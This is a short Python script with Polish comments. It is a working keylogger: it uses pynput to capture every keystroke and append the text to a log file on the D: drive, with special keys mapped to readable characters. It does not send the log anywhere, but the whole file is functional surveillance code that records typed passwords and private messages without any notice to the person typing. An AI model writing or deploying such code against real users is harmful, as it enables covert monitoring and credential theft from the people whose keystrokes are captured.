from pynput.keyboard import Key, Listener
import os
import logging
from os import path

#jesli nie ma to zrób
if not os.path.exists("D:\\Nowy folder"):
    os.mkdir("D:\\Nowy folder")
#os.mkdir("D:\\p")
#f = open("D:\\p\\logi.txt", "a+")
#warunki

#czas= ""

def on_press(Key):
    key = str(Key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.backspace":
        key = "|"
    if key == "Key.shift":
        key = ""
    if key == "Key.alt_gr":
        key = ""
    if key == "Key.alt_l":
        key = ""
    if key == "Key.cmd":
        key = ""

    #logging.info(str(key))
    with open("D:\\Nowy folder\\logi.txt", 'a') as f:
        f.write(key)

with Listener(on_press=on_press) as l:
    l.join()